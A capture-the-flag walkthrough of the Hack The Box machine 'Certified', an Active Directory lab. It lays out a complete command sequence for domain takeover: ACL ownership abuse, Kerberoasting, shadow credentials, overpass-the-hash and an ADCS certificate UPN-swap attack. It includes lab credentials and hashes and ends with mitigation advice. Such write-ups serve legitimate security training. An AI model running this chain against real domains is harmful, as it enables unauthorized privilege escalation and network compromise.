# Certified HTB Walkthrough


[![Hack The Box](https://img.shields.io/badge/HackTheBox-Certified-orange?logo=hackthebox)](https://app.hackthebox.com/machines/633)
[![Difficulty: Easy](https://img.shields.io/badge/Difficulty-Medium-orange)](https://github.com/subhash00/HackTheBox/)
[![Platform: Windows](https://img.shields.io/badge/Platform-Windows-blue)](https://github.com/subhash00/HackTheBox/)
[![Topic: Active Directory](https://img.shields.io/badge/Topic-Active%20Directory-yellowgreen)](https://en.wikipedia.org/wiki/Active_Directory)

---

## Overview

This document provides a step-by-step walkthrough for the Certified HTB lab, detailing all exploitation steps and commands. The guide traces the attack path from initial enumeration to obtaining Domain Admin privileges, explaining the logic and technical skills used throughout the engagement.

---

## Table of Contents

- [Overview](#overview)
- [Recon & Enumeration](#recon--enumeration)
- [Privilege Escalation](#privilege-escalation)
- [Kerberos and Certificate Abuse](#kerberos-and-certificate-abuse)
- [Domain Admin & Final Access](#domain-admin--final-access)
- [Stepwise PoC](#stepwise-poc)
- [Tools Used](#tools-used)
- [Technologies Used](#technologies-used)
- [Mitigation](#mitigation)

---

## Recon & Enumeration

- **Port Discovery and Service Enumeration**
    ```
    ports=$(nmap -p- --min-rate=1000 -T4 10.129.231.186 | grep '^[0-9]' | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
    nmap -p$ports -sV -sC 10.129.231.186
    ```
- **Hosts File Mapping**
    ```
    echo "10.129.231.186 certified.htb dc01.certified.htb" | sudo tee -a /etc/hosts
    ```
- **Collect Bloodhound Data**
    ```
    bloodhound-python -d certified.htb -u judith.mader -p judith09 -dc dc01.certified.htb -c all -ns 10.129.231.186 --zip
    ```

---

## Privilege Escalation

- **Attempt Remote PowerShell Access**
    ```
    evil-winrm -i certified.htb -u judith.mader -p judith09
    ```
    - Judith lacks access. Bloodhound reveals `WriteOwner` and escalation via groups.

- **Overwrite Ownership and Escalate**
    ```
    python owneredit.py -action write -new-owner 'judith.mader' -target 'management' certified.htb/judith.mader:'judith09'
    OR
    bloodyAD --host dc01.certified.htb -d certified.htb -u 'judith.mader' -p 'judith09' set owner Management judith.mader
    bloodyAD --host DC01.certified.htb -d certified.htb -u 'judith.mader' -p 'judith09' add genericAll Management judith.mader
    ```
- **Group Management via SMB**
    ```
    net rpc group addmem management judith.mader -U certified.htb/"judith.mader"%"judith09" -S dc01.certified.htb
    net rpc group members management -U certified.htb/"judith.mader"%"judith09" -S dc01.certified.htb
    ```
- **Time Synchronization**
    ```
    sudo ntpdate -u 10.129.231.186
    ```

- **Kerberoasting**
    ```
    impacket-GetUserSPNs -request -spn management_svc/certified.htb -dc-ip 10.129.231.186 certified.htb/judith.mader:judith09
    john --wordlist=/usr/share/wordlists/rockyou.txt hash
    ```
    - Hash Cracking not working. Also tried hashcat but not working. 

---

## Kerberos and Certificate Abuse

- **Abuse msDS-KeyCredentialLink**
    ```
    certipy shadow auto -u 'judith.mader@certified.htb' -p 'judith09' -account 'MANAGEMENT_SVC' -dc-ip 10.129.94.37
    ```
    - Get NTLM hash from GenericWrite: a091c1832bcdd4677c28b5a6a1295584.

- **Authenticate as MANAGEMENT_SVC**
    ```
    evil-winrm -i certified.htb -u MANAGEMENT_SVC -H a091c1832bcdd4677c28b5a6a1295584
    ```
- **Overpass-the-Hash: Create Kerberos Ticket**
    ```
    impacket-getTGT -dc-ip 10.129.94.37 -hashes 00000000000000000000000000000000:a091c1832bcdd4677c28b5a6a1295584 CERTIFIED/MANAGEMENT_SVC
    export KRB5CCNAME=./MANAGEMENT_SVC.ccache
    ```

---

## Domain Admin & Final Access

- **Take Over CA Operator & Abuse UPN**
    ```
    bloodyAD --host DC01.certified.htb -d certified.htb -k set password ca_operator test123456
    certipy find -dc-ip 10.129.94.37 -target DC01.certified.htb -u ca_operator -p 'test123456' -vulnerable
    bloodyAD --host DC01.certified.htb -d certified.htb -k get object ca_operator --attr userPrincipalName
    bloodyAD --host DC01.certified.htb -d certified.htb -k set object ca_operator userPrincipalName -v administrator
    sudo ntpdate -u 10.129.94.37
    certipy-ad req -dc-ip 10.129.94.37 -target DC01.certified.htb -ca certified-DC01-CA -u ca_operator -p 'test123456' -template 'CertifiedAuthentication'
    bloodyAD --host DC01.certified.htb -d certified.htb -k set object ca_operator userPrincipalName -v ca_operator@certified.htb
    certipy auth -pfx administrator.pfx -domain certified.htb
    evil-winrm -i certified.htb -u Administrator -H 0d5b49608bbce1751f708748f67e2d34
    ```
    - Taking over ca_operator by setting its password in BloodyAD possible due to genericAll permission.
    - Check AD CS for vulnerable certificate templates using Certipy.
    - Set ca_operator’s UPN to match administrator’s SAM account name.
    - Request the vulnerable cert as ca_operator.
    - Reset ca_operator’s UPN to avoid any unintended identity mapping collisions.
    - Authenticate as Administrator using the issued certificate.

---

## Stepwise PoC

<details>
<summary>💻<strong>(click to expand)</strong> </summary>
<img width="1528" height="826" alt="25" src="https://github.com/user-attachments/assets/b87f4690-d455-431b-bdeb-a25883c76ba8" />
<img width="1084" height="82" alt="24" src="https://github.com/user-attachments/assets/6185cadf-3b7b-4df5-b09f-55bfb67e0b1f" />
<img width="1692" height="661" alt="23" src="https://github.com/user-attachments/assets/dc4de8dc-e8e9-4190-86a4-beb19de78d16" />
<img width="1145" height="463" alt="22" src="https://github.com/user-attachments/assets/5da3759f-0773-4d82-870d-7282d774bb8b" />
<img width="809" height="409" alt="21" src="https://github.com/user-attachments/assets/583d4cc6-9d5a-4c29-b925-0675944f6b38" />
<img width="1081" height="334" alt="20" src="https://github.com/user-attachments/assets/9e2bda08-7281-4f1b-b434-709c7463649f" />
<img width="965" height="132" alt="19" src="https://github.com/user-attachments/assets/4a4fee34-9fb5-4082-b59a-1cfffdc66aed" />
<img width="983" height="109" alt="18" src="https://github.com/user-attachments/assets/e4385796-9e73-432c-9ea3-279dab468879" />
<img width="991" height="151" alt="17" src="https://github.com/user-attachments/assets/0efc6bbd-0ebb-4f46-a869-51a146fafa77" />
<img width="1068" height="127" alt="16" src="https://github.com/user-attachments/assets/4b0b8bf7-85af-4e1d-9d20-238fe45966c6" />
<img width="1904" height="744" alt="15" src="https://github.com/user-attachments/assets/b237d985-8526-4e8d-9fd9-84f274f94052" />
<img width="1132" height="702" alt="14" src="https://github.com/user-attachments/assets/412349e3-c583-495c-9718-d76a0f0737c6" />
<img width="1634" height="608" alt="13" src="https://github.com/user-attachments/assets/adec6691-9f5a-4c18-be84-5cd893f9b862" />
<img width="1600" height="420" alt="12" src="https://github.com/user-attachments/assets/ab1ab0ce-cf77-402f-8f99-5ae777d35613" />
<img width="1623" height="730" alt="11" src="https://github.com/user-attachments/assets/8b2536c2-e5c5-4ee3-9155-3bdf4922f30c" />
<img width="994" height="297" alt="10" src="https://github.com/user-attachments/assets/63125b5c-be27-4540-88ff-5503ca5be995" />
<img width="973" height="128" alt="9" src="https://github.com/user-attachments/assets/08594ce1-c6df-4194-8c3f-4c13362748ee" />
<img width="989" height="651" alt="8" src="https://github.com/user-attachments/assets/c694276c-7032-46c4-bc31-e3121e6e9bb0" />
<img width="943" height="873" alt="7" src="https://github.com/user-attachments/assets/1fe5e481-876b-4208-bd45-aba0d262f5fe" />
<img width="1160" height="624" alt="6" src="https://github.com/user-attachments/assets/dea7f3fa-72f8-4682-9e10-1556a47b3a63" />
<img width="988" height="669" alt="5" src="https://github.com/user-attachments/assets/b82c26a1-d4bf-4ea7-a4e7-9ffb490f253f" />
<img width="1477" height="405" alt="4" src="https://github.com/user-attachments/assets/6da32cc2-f6f4-498e-92ec-f7c6582e0549" />
<img width="1888" height="310" alt="3" src="https://github.com/user-attachments/assets/69db6b52-29be-40e1-914b-48c2b9a9614c" />
<img width="1370" height="329" alt="2" src="https://github.com/user-attachments/assets/fe4e1b06-8830-426b-bc6c-4d38dc8853e6" />
<img width="1645" height="445" alt="1" src="https://github.com/user-attachments/assets/2590ceab-c4e6-41db-8fd8-b7a58147fdf9" />
</details>

---

## Tools Used

- **nmap**: Fast port scanner for network service discovery.
- **Bloodhound/Bloodhound-python**: Active Directory attack path mapping and privilege visualization.
- **evil-winrm**: Tool to gain remote PowerShell access via WinRM.
- **python owneredit.py**/**bloodyAD**: Tools for manipulating AD group ownership and ACLs.
- **net rpc**: Manage domain groups via SMB from Linux.
- **sudo ntpdate**: Syncs attacker's system time to target domain controller.
- **impacket-GetUserSPNs**: Performs kerberoasting attack to extract service principal names.
- **john/hashcat**: Cracks hashes obtained from Kerberoasting or other attacks.
- **certipy**: Attacks and abuses Active Directory Certificate Services (ADCS).
- **impacket-getTGT**: Forges Kerberos tickets using NTLM hashes.
  
Each tool is chosen for its ability to perform reconnaissance, privilege escalation, and exploitation techniques against AD environments.

---

## Technologies Used

- **Active Directory (AD)**: Microsoft's directory service supporting authentication, privileges, and policies across a Windows network.
- **Kerberos**: Secure ticket-based authentication protocol used for domain logons and service access.
- **ADCS (Active Directory Certificate Services)**: Microsoft PKI system for managing certificates and authentication.
- **WinRM (Windows Remote Management)**: Protocol that enables PowerShell remoting and administrative tasks.
- **SMB/CIFS**: Network file and resource sharing protocol.
- **NTP (Network Time Protocol)**: Service for clock synchronization (necessary for Kerberos).
- **Password Hashes/NTLM**: Authentication token used for Kerberos/overpass-the-hash and pass-the-hash techniques.

Each technology was a critical component of the exploitation path, allowing access, privilege escalation, or lateral movement.

---

## Mitigation

- **Enforce Least Privilege**
  - Limit membership in privileged groups (Domain Admins, Enterprise Admins, Administrators) and remove unnecessary rights from users and service accounts.
  - Regularly review ACLs on sensitive AD objects and groups to prevent excessive access.

- **Harden Certificate Services (ADCS)**
  - Restrict enrollment permissions and disable vulnerable certificate templates.
  - Monitor certificate issuance and usage for unusual activity.
  - Patch and securely configure ADCS components, update cryptographic settings to use strong algorithms.

- **Strengthen Credential Security**
  - Require strong, unique passwords for all accounts, especially service and admin accounts.
  - Use password managers or random passwords. Block common passwords and set lockout policies.
  - Regularly rotate credentials and review accounts for Kerberoasting-resistant passwords.

- **Reduce Attack Surface**
  - Remove unused, stale user/computer accounts and local administrator accounts across all hosts.
  - Disable WinRM (PowerShell Remoting) where not needed or restrict by firewall rules and network segmentation.
  - Apply application allowlisting and reduce installed software on domain controllers.

- **Monitoring & Logging**
  - Enable and centrally collect AD security logs, especially for group memberships, certificate operations, and privilege changes.
  - Audit and monitor for abnormal Kerberos ticket requests, certificate requests, and WinRM connections.
  - Use commercial/free solutions (SIEM, EDR, BloodHound, AD assessment tools) for continuous visibility.

- **Network and Host Security**
  - Segment networks and restrict lateral movement where possible.
  - Use secure administrative workstations for privileged operations.
  - Keep all domain controllers, servers, and endpoints patched and running supported operating systems.

- **Incident Response & Recovery**
  - Maintain tested incident recovery plans and backup strategies for AD and ADCS.
  - Immediately respond to compromised accounts by disabling and resetting credentials, revoking unauthorized certificates, and reviewing recent privilege changes.

---
